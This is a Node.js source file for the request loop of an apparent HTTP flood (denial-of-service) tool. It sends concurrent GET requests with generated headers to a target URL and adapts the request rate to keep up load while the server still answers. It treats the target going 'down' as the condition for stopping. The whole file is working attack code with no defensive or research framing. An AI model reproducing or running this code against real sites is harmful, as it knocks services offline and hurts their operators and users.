const { sleep } = require('./helpers')
const { spawnClientInstance } = require('./client')
const { generateRequestHeaders } = require('./headers')
const { ATTEMPTS, FAILURE_DELAY, REQ_DELAY, INTERVAL, MAX_CONCURRENT_REQUESTS } = require('./constants')
const { getUrl } = require('./args')

/**
 * @param {string} url
 */
const runner = async (url) => {
  const URL = getUrl(url)
  let CONCURRENT_REQUESTS = 2
  console.log('Starting process for', URL)

  const client = spawnClientInstance(URL)

  let isRunning = true
  let pending = 0
  let lastMinuteOk = 0
  let lastMinuteErr = 0
  let failureAttempts = 0

  let errRate = 0
  let requests_made = 0
  let rps = 0

  const logInterval = setInterval(() => {
    if (failureAttempts === 0) {
      console.log(URL, '|', 'Req', requests_made, '|', 'Errors,%', errRate, '| rps', rps, '| R', CONCURRENT_REQUESTS)
    }
  }, INTERVAL)

  const adaptivenessInterval = 10
  const adaptInterval = setInterval(() => {
    if (failureAttempts === 0) {
      rps = Math.floor((lastMinuteOk + lastMinuteErr) / adaptivenessInterval)
      lastMinuteOk = 0
      lastMinuteErr = 0

      if (errRate > 40) {
        CONCURRENT_REQUESTS = Math.floor(rps * 0.5)
      } else if (errRate > 20) {
        CONCURRENT_REQUESTS = Math.floor(rps * 0.8)
      } else if (errRate > 9) {
        CONCURRENT_REQUESTS = Math.floor(rps * 0.9)
      } else if (errRate < 2) {
        CONCURRENT_REQUESTS = Math.min(Math.floor(rps * 1.05), MAX_CONCURRENT_REQUESTS)
      }
    }
  }, adaptivenessInterval * 1000)

  while (isRunning) {
    await sleep(REQ_DELAY)

    if (pending < CONCURRENT_REQUESTS) {
      pending++

      client
        .get(URL, {
          headers: generateRequestHeaders(),
        })
        .then(() => {
          failureAttempts = 0
          lastMinuteOk++
        })
        .catch(() => {
          lastMinuteErr++
        })
        .finally(() => {
          pending--
          requests_made++
          errRate = Math.floor(100 * ((1 + lastMinuteErr) / (1 + lastMinuteErr + lastMinuteOk)))
        })
    } else if (CONCURRENT_REQUESTS < 2 || errRate > 90) {
      console.log('WARN:', URL, 'down. Sleeping for', FAILURE_DELAY, 'ms')
      failureAttempts++
      // stop process
      if (failureAttempts >= ATTEMPTS) {
        clearInterval(adaptInterval)
        clearInterval(logInterval)
        isRunning = false
      } else {
        CONCURRENT_REQUESTS = 2
        await sleep(FAILURE_DELAY)
      }
    }
  }

  console.log('INFO:', URL, 'is still down after', ATTEMPTS * FAILURE_DELAY, 'ms.', 'Terminating...')
}

module.exports = { runner }
